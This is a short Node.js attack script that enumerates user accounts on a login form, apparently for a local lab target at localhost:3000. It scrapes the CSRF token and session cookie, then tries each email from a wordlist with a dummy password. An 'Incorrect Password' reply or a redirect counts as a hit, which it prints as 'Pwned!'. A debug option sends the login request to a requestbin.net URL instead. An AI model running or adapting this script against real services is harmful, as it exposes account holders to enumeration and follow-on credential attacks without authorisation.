import axios from 'axios';
import { inspect } from 'util';
import { readFileSync, exists } from 'fs';
import * as qs from 'qs';

const bruteForce = async (email) => {
    const client = axios.create();
    const response = await client.get('http://localhost:3000/login');
    const body = response.data;
    const match = /name="authenticity_token" value="([^"]*)"/g.exec(response.data);
    const csrfToken = match[1];

    const payload = {
        'utf8': '✓',
        'authenticity_token': csrfToken,
        'email': email,
        'password': 'DUMMY-PASSWORD',
        'commit': 'Login'
    }
    const debug = false;
    try {
        const loginResponse = await client.post(debug ? 'http://requestbin.net/r/1hspjub1' : 'http://localhost:3000/sessions', qs.stringify(payload),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    Cookie: response.headers['set-cookie'][0].split(";")[0].trim()
                },
                maxRedirects: 2,
            });
        //console.log(inspect(loginResponse));
        const match = /Incorrect Password/g.exec(loginResponse.data);
        if (match && match[0]) {
            //console.log('Found');
            return true;
        } else {
            //console.log('not found');
            return false;
        }
    } catch (error) {
        if (error.response && error.response.status == 302) {
            return true;
        }
        else {
            throw error;
        }
    }
    return false;
}


const tryUsernameWordlist = async () => {
    const wordlist = readFileSync('userlist.txt').toString().split('\n');
    for (const word of wordlist) {
        console.log(`Trying ${word}`);
        const hacked = await bruteForce(word);
        if (hacked) {
            console.log('----------------------------------------------------')
            console.log(`😎 Pwned! This email exists: ${word}`);
            console.log('----------------------------------------------------')
        }
    }
}



tryUsernameWordlist();
